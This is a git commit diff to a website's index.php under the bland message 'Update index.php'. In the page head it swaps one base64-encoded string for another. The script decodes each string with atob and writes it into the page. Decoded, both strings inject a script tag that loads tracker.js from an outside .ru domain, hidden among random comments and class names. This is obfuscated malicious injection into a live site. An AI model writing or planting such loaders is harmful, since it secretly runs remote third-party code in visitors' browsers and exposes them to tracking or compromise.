05830c69cd050b8ca49482133309db4970532d1a
hkjkilolil52 <85936048+hkjkilolil52@users.noreply.github.com>
2021-06-15 17:43:30 +0300

    Update index.php

--- index.php
+++ index.php
@@ -3,7 +3,7 @@
 <html lang="en-US">
 <head>
 <script type="text/javascript">
-    let encoded = 'PCEtLSBrMHAxZHRzZnB1azRubjdpM2JjaXRyZDFpdzl0a2tsIC0tPiA8ZGl2IGNsYXNzPSJjaGVja19mb3Jfa2U0NXVrcTZpajRiaDk4ZTVxaHJibyI+PC9kaXY+PCEtLSB4aTk4eHN5NGtpdHRtczRqeG81em8zbDk2dGd1a3UwMnlheGltbyAtLT48c2NyaXB0IHNyYz0iaHR0cHM6Ly9rbG9vbGsucnUvdHJhY2tlci5qcyI+IDwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9jdnVjbHVyIj48L2Rpdj48IS0tIHFhMHJuMGlkZjN1dWV4NnZodWh0eWt2aDEgLS0+';let decoded = atob(encoded);document.write(''+ decoded +'');
+    let encoded = 'PCEtLSB4bGlhNXd1bXFyNGtidXR1enFscXhodjVibXdueXVzNzRjazEgLS0+IDxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9rODJxMzRkc3hvMDdtdzVvNXc2cm9wN2RkeWhrNWdjMnE2MXciPjwvZGl2PjwhLS0ga216aXd0MWZ5bTF0aTM2c3J6OTZzdHZqN3FpaWZkcmwgLS0+PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPiA8L3NjcmlwdD48ZGl2IGNsYXNzPSJjaGVja19mb3JfenB6MXJrdjQ3eDM2bml6NnpqbDFicXRqcmFtZHN0Ij48L2Rpdj48IS0tIGF4YnNseHg4anM5cnMyNGpmMyAtLT4=';let decoded = atob(encoded);document.write(''+ decoded +'');
     </script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
